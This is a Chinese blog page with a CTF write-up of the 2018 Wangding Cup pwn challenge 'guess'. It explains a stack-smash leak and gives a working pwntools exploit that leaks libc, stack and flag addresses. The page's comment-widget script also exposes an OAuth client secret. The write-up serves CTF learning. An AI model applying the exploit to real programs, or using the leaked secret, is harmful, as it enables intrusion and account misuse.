<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Sivona">





<title>2018网鼎杯pwn | Hexo</title>



    <link rel="icon" href="/ida.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    




<meta name="generator" content="Hexo 4.2.0"></head>
<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Sivona&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Sivona&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
        <div class="main">
            <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">2018网鼎杯pwn</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Sivona</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">April 22, 2020&nbsp;&nbsp;17:34:45</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/writeup/">writeup</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <blockquote>
<p>因为下个月要参加网鼎杯，看一下上一届的题</p>
</blockquote>
<h2 id="guess"><a href="#guess" class="headerlink" title="guess"></a>guess</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">&#96;&#96;&#96;  </span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;cpp</span><br><span class="line">  HIDWORD(stat_loc.__iptr) &#x3D; open(&quot;.&#x2F;flag.txt&quot;, 0, a2);</span><br><span class="line">  if ( HIDWORD(stat_loc.__iptr) &#x3D;&#x3D; -1 )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(&quot;.&#x2F;flag.txt&quot;);</span><br><span class="line">    _exit(-1);</span><br><span class="line">  &#125;</span><br><span class="line">  read(SHIDWORD(stat_loc.__iptr), buf, 0x30uLL);</span><br><span class="line">  close(SHIDWORD(stat_loc.__iptr));</span><br></pre></td></tr></table></figure>

<p>这题开启了canary，并且将flag.txt的内容读到了栈中，让人不禁想到stack smash （想了好久。。<br>一开始没想明白程序是怎么执行的，几乎没做过开发，第一次见到fork()这个函数，上网看了一下前辈的博客。<br>fork()会创建一个子进程，并且在进程表中为他建立一个新的表项，复制父进程的几乎所有信息，只有fork()的返回值不同，子进程返回0，父进程返回子进程的pid。  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &gt;= v7 )<span class="comment">//控制fork次数</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"you have no sense... bye :-) "</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = sub_400A11();</span><br><span class="line">    <span class="keyword">if</span> ( !v5 )<span class="comment">//子进程在此处跳出循环</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++v6;</span><br><span class="line">    wait((__WAIT_STATUS)&amp;stat_loc); <span class="comment">//父进程在此处堵塞等待子进程exit</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>跟进一下___stack_chk_fail函数  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────────────────────</span><br><span class="line">In file: /home/sivona/glibc<span class="number">-2.23</span>/debug/stack_chk_fail.c</span><br><span class="line">   <span class="number">22</span> <span class="keyword">extern</span> <span class="keyword">char</span> **__libc_argv attribute_hidden;</span><br><span class="line">   <span class="number">23</span> </span><br><span class="line">   <span class="number">24</span> <span class="keyword">void</span></span><br><span class="line">   <span class="number">25</span> __attribute__ ((noreturn))</span><br><span class="line">   <span class="number">26</span> __stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line"> ► <span class="number">27</span> &#123;</span><br><span class="line">   <span class="number">28</span>   __fortify_fail (<span class="string">"stack smashing detected"</span>);</span><br><span class="line">   <span class="number">29</span> &#125;</span><br><span class="line">───────────────────────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────────────────────</span><br><span class="line">In file: /home/sivona/glibc<span class="number">-2.23</span>/debug/fortify_fail.c</span><br><span class="line">   <span class="number">32</span>     do_abort = <span class="number">1</span>;</span><br><span class="line">   <span class="number">33</span>   <span class="keyword">else</span></span><br><span class="line">   <span class="number">34</span>     do_abort = <span class="number">2</span>;</span><br><span class="line">   <span class="number">35</span>   <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">   <span class="number">36</span>   <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line"> ► <span class="number">37</span>     __libc_message (do_abort, <span class="string">"*** %s ***: %s terminated\n"</span>,</span><br><span class="line">   <span class="number">38</span> 		    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>);</span><br><span class="line">   <span class="number">39</span> &#125;</span><br><span class="line">   <span class="number">40</span> libc_hidden_def (__fortify_fail)</span><br></pre></td></tr></table></figure>

<p>计算一下__libc_argv和我们输入的内容的偏移就可以打印flag，当然因为aslr还需要泄露libc和栈地址，同样利用stack smash 泄露_environ地址，计算flag偏移。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"><span class="comment">#io = process("./GUESS", env = &#123;"LD_PRELOAD": "./libc.so.6"&#125;)</span></span><br><span class="line">io = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29959</span>)</span><br><span class="line">elf = ELF(<span class="string">"./GUESS"</span>)</span><br><span class="line"><span class="comment">#  libc = elf.libc</span></span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io, "b *0x400B23\n")</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">"flag\n"</span>, <span class="string">'a'</span> * <span class="number">0x128</span> + p64(elf.got[<span class="string">'__libc_start_main'</span>]))</span><br><span class="line">libc.address = u64(io.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>: ].ljust(<span class="number">8</span>, <span class="string">'\0'</span>)) - libc.sym[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">info(<span class="string">"libc:"</span>+hex(libc.address))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">"flag\n"</span>, <span class="string">'a'</span> * <span class="number">0x128</span> + p64(libc.sym[<span class="string">'_environ'</span>]))</span><br><span class="line">stack = u64(io.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>: ].ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info(<span class="string">"stack:"</span>+hex(stack))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">"flag\n"</span>, <span class="string">'a'</span> * <span class="number">0x128</span> + p64(stack - <span class="number">0x168</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<div id="gitalk-container"></div>
<script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>

		<script>
		var gitalkConfig = {"clientID":"787cc455593c1fb9cfcd","clientSecret":"f6abba3d9cc77878426ee16aa8bcb980fd3cd70c","repo":"s1vona.github.io","owner":"s1vona","admin":["s1vona"],"distractionFreeMode":true};
	    gitalkConfig.id = md5(location.pathname);
		var gitalk = new Gitalk(gitalkConfig);
	    gitalk.render("gitalk-container");
	    </script>
        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>Sivona</span>
                    </p>
                
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/wdb/"># wdb</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
            
            <a class="next" rel="next" href="/2020/03/30/%E7%8C%A5%E7%90%90/">猥琐</a>
            
        </section>


    </article>
</div>

        </div>
        <footer id="footer" class="footer">
    <div class="copyright">
        <span>© Sivona | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>
</html>
